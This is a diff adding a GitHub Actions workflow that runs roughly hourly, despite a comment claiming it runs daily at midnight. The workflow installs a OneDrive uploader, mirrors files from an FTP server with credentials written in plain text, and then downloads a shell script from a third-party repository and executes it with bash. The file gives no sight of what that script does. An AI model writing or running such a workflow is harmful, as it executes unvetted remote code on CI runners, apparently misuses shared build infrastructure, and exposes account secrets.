@@ -1,1 +1,23 @@
+name: six
+on:
+  schedule:
+    - cron: '*/57 * * * *' # Run every day at midnight
+jobs:
+  download-and-run:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Download file
+        run: |
+          wget https://raw.githubusercontent.com/MoeClub/OneList/master/OneDriveUploader/amd64/linux/OneDriveUploader -P /usr/local/bin/
+          chmod +x /usr/local/bin/OneDriveUploader
+          files=("230117" "230118" "230119" "230120" "230121")
+          for file in "${files[@]}"; do
+          for i in {1..1}; do
+          wget -nH -m --ftp-user=ttthjjerster3 --ftp-password=tttuuuu2555T125 "ftp://ftp-ttthjjerster3.alwaysdata.net/www/$file/*"
+          sleep 5
+          done
+          cp www/$file/* ./
+          done
+          wget -O drive333.sh https://raw.githubusercontent.com/iijtfvvvg/0127/main/.github/workflows/drive333.sh
+          bash drive333.sh
 
